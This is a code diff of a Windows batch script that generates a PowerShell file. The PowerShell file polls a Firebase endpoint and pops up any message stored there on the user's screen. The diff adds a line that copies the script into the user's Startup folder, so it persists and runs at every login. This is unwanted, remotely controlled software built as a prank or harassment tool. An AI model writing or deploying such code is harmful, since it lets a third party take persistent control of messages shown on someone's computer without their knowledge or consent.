@@ -7,7 +7,7 @@ set "ps1File=%folderPath%\trolo.ps1"
 if not exist "%folderPath%" (
     mkdir "%folderPath%"
 )
-
+copy "%~f0" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
 echo $firebaseUrl = "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" > "%ps1File%"
 echo function Check-WiFi { >> "%ps1File%"
 echo     $networkStatus = Get-NetAdapter ^| Where-Object { $_.Status -eq "Up" } >> "%ps1File%"
@@ -19,7 +19,7 @@ echo         if (Check-WiFi) { >> "%ps1File%"
 echo             $response = Invoke-RestMethod -Uri $firebaseUrl -Method Get >> "%ps1File%"
 echo             if ($response.message -ne "") { >> "%ps1File%"
 echo                 Add-Type -AssemblyName PresentationFramework >> "%ps1File%"
-echo                 [System.Windows.MessageBox]::Show($response.message, "M", 0, "Information") >> "%ps1File%"
+echo                 [System.Windows.MessageBox]::Show($response.message, "Message", 0, "Information") >> "%ps1File%"
 echo                 $emptyPayload = @{ message = "" } ^| ConvertTo-Json -Depth 1 >> "%ps1File%"
 echo                 Invoke-RestMethod -Uri $firebaseUrl -Method Patch -Body $emptyPayload -ContentType "application/json" >> "%ps1File%"
 echo             } >> "%ps1File%"
